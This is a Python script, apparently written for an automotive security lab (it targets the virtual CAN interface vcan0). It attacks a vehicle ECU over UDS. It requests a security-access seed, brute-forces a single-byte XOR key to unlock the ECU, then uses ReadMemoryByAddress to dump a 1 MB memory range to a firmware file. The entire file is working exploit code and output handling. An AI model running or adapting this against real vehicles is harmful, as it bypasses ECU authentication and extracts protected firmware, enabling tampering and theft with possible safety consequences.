import isotp
import struct
import time
import can

# --- [CONFIGURATIONS] ---
CAN_CHANNEL = 'vcan0'
RXID = 0x7E8
TXID = 0x7E0  # 수석님 코드의 txid 기준
REQ_ID_CAN = 0x7DF # SA 요청용 브로드캐스트 ID

# struct 헬퍼 함수 (수석님 코드 방식)
p8 = lambda x: struct.pack('>B', x)
p32 = lambda x: struct.pack('>I', x)

def singleByteTransform(source, byteLen):
    ret = 0
    for _ in range(byteLen):
        ret = (ret << 8) | source
    return ret

def run_combined_dump():
    # 1. Security Access 단계 (python-can 사용)
    # isotp 소켓 점유 전 일반 CAN 통신으로 SA 해제 수행
    bus = can.interface.Bus(interface='socketcan', channel=CAN_CHANNEL, bitrate=500000)
    print("[*] Security Access Phase Started...")
    
    # Seed 요청
    bus.send(can.Message(arbitration_id=REQ_ID_CAN, data=[0x02, 0x27, 0x01, 0, 0, 0, 0, 0], is_extended_id=False))
    res = bus.recv(timeout=1.0)
    
    if not res or res.data[1] != 0x67:
        print("[-] Failed to get seed"); bus.shutdown(); return
    
    seed_byte = res.data[3:7]
    print(f"[+] Seed found: {seed_byte.hex().upper()}")

    # Key Unlock (브루트포스)
    sa_success = False
    for i in range(0x00, 0x100):
        cipher = singleByteTransform(i, 4)
        seed_int = int.from_bytes(seed_byte, byteorder='big')
        key_int = seed_int ^ cipher
        key_hex = key_int.to_bytes(4, 'big')
        
        # 07 27 02 [KEY] 00
        msg_data = [0x07, 0x27, 0x02] + list(key_hex) + [0x00]
        bus.send(can.Message(arbitration_id=REQ_ID_CAN, data=msg_data, is_extended_id=False))
        
        sa_res = bus.recv(timeout=0.05)
        if sa_res and (0x67 in sa_res.data):
            print(f"[!] Unlock Success with Key index: {hex(i)}")
            sa_success = True
            break
    
    bus.shutdown() # SA 해제 후 소켓 반환
    if not sa_success: return

    # 2. 고속 덤프 단계 (isotp 소켓 사용)
    print("[*] Starting Senior-style High-speed Dump...")
    s = isotp.socket()
    s.bind(CAN_CHANNEL, isotp.Address(rxid=RXID, txid=TXID))
    
    cmd = b'\x23\x24\x00' # ALFID 24 (Addr 4, Len 2)
    size = b'\x01\x00'    # 0x100 (256바이트)
    senior_bin = b''

    try:
        # 수석님 코드의 주소 범위: 0x400000 ~ 0x4FFFFF
        for i in range(0x40, 0x50):
            for j in range(0x100):
                # 수석님 방식 주소 생성: 00 [i] [j] 00
                pl = cmd + p8(i) + p8(j) + b'\x00' + size
                print(f'Processing... {pl.hex()} | Total: {len(senior_bin)} bytes', end='\r')
                
                s.send(pl)
                result = s.recv()
                
                if result == b'\x7f\x23\x31': # Request Out Of Range
                    break
                
                # UDS 긍정응답(63) 제거 로직
                if result and result[0] == 0x63:
                    senior_bin += result[1:]
                else:
                    senior_bin += result
                    
                time.sleep(0.01) # isotp 소켓은 내부적으로 처리가 빨라 sleep을 줄여도 됩니다.
    except Exception as e:
        print(f"\n[ERROR] Dump interrupted: {e}")

    # 3. 파일 저장
    if senior_bin:
        with open('senior_firmware.bin', 'wb') as f:
            f.write(senior_bin)
        print(f"\n[SUCCESS] {len(senior_bin)} bytes saved to senior_firmware.bin")
    else:
        print("\n[-] No data collected.")

if __name__ == "__main__":
    run_combined_dump()